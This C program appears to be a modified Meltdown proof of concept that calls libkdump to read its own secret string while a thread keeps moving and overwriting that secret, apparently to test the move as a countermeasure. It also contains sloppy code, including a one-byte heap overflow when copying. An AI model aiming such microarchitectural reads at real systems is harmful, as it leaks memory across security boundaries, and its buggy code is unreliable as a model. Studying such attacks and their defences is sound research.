#include "libkdump.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pthread.h>

char * strkopi(char *dest, char *src, char *timpa, int c);
char * kopi(char *dest, char *src, int c);

//char * secret;// = test;
char * gkey;// ="";
int x=0;


char *strings[] = {
    "If you can read this, at least the auto configuration is working",
    "Generating witty test message...",
    "Go ahead with the real exploit if you dare",
    "Have a good day.",
    "Welcome to the wonderful world of microarchitectural attacks",
    "Pay no attention to the content of this string",
    "Please wait while we steal your secrets...",
    "Would you like fries with that?",
    "(insert random quote here)",
    "Don't panic...",
    "Wait, do you smell something burning?",
    "How did you get here?"};
char string[]= "The Magic Words are Squeamish Ossifrage.";//"Welcome to the wonderful world of microarchitectural attacks";
char * secret = string;


/********************************************************************
Moving fungtion
********************************************************************/
char *kopi(char *dest, char *src, int c)
{
   int i=0;
   for(i=0;i<c;i++){
	*dest = *src;
	*dest++;
	*src++;
   }
   //while(*dest++ = *src++);
   //gkey=dest;
        //strkopi(r[j],timpa,timpa);

   return dest;
}


char * strkopi(char *dest, char *src, char *timpa, int c)
{
   int i=0;
   //while (*src) {
   for(i=0;i<c;i++){
      *dest = *src;
      *src = *timpa;
      src++;
      dest++;
      timpa++;
   }
   *dest = '\0';
   return dest;
}

void * movement()//void *vargp)
{
    //volatile char r[7][33];//r[3][17];// = 0;
    //volatile char *s[7];
    //printf("begin movement initialization");
    char **r = malloc(sizeof(char*)*11);
    int i, a=0, c=0;
    c=strlen(secret);
    char random[] = "gggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggggg";
    for(i=0;i<11;i++){
        r[i] = malloc(c);//8192);//2048);//257);
        strkopi(r[i],random,random,c);//"gggggggggggggggggggggggggggggggg");
        //s[i]=r[i];
    }
    //printf("awal movement loop %d, %s \n",c, r[0]);
    i=0;

    //int x=0;
    int j=0;
    //char keys[] = "01234f6789a0a1a2a3a4a5f6a7a8a9b1";//0123456789a0a1a2a3a4a5a6a7a8a9b1012$
    char timpa[]= "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";
    //s[2]="0123456789abcdef";
    //strkopi(r[10],secret,timpa);
    //strkopi(secret,timpa,timpa);
    //secret= r[10];
    //r[10]=secret;
    gkey=secret;
    //kopi(r[10], secret);
    //printf("before copy \n");
    strkopi(r[10],secret,timpa,c);
    //printf("test\n");
    secret=r[10];
    //printf("di luar loop \n");
    while(x==0){
        //x=x+1;
        j=i+10;
        if(j>=15){
                j=j-15;
        }
	//printf("nilai a \n");
        kopi(r[i],r[j],c);

        if(i==10){
                kopi(gkey,r[i],c);
                secret=gkey;
        }else{
                //secret=r[i];
		kopi(secret,timpa,c);
        }
        if(j==10){
                kopi(gkey,timpa,c);
        }
        kopi(r[j],timpa,c);
        a++;
        //sleep(10);
        //printf("nilai secret: %s\n", secret);//, gkey, r[i]);
        //printf("nilai gkey : %s \n", gkey);
        //printf("keys : %s\n", r[i]);
        //s[j]="0000000000000000";
        //strkopi(s[j],timpa);
        i=i+5;
        if(i==15){
                i=0;
        }
        nanosleep((const struct timespec[]){{0, 5000000L}}, NULL);
        //sleep(2);
        //x++;
    }
     j=i+10;
    if(j>=15){
           j=j-15;
    }
    kopi(r[j],timpa,c);
    printf("Moving number : %d\n", a);

}




int main(int argc, char *argv[]) {
  libkdump_config_t config;
  config = libkdump_get_autoconfig();
  libkdump_init(config);
  pthread_t tid;
  srand(time(NULL));
  //char * test = strings[rand() % (sizeof(strings) / sizeof(strings[0]))];
  //char test[] = strings[rand() % (sizeof(strings) / sizeof(strings[0]))];
  //secret=test;
  int index = 0;
  //secret = test;

  printf("Expect: \x1b[32;1m%s\x1b[0m\n", secret);//test);
  printf("   Got: \x1b[33;1m");
  pthread_create(&tid, NULL, movement, NULL);
  while (index < strlen(secret)) {
    int value = libkdump_read((size_t)(secret + index));
    printf("%c", value);
    fflush(stdout);
    index++;
    //printf("\nExpect: \x1b[32;1m%s\x1b[0m\n", secret);
    nanosleep((const struct timespec[]){{0, 5000000L}}, NULL);
  }

  printf("\x1b[0m\n");
  libkdump_cleanup();
   x=1;
  pthread_exit(NULL);


  return 0;
}
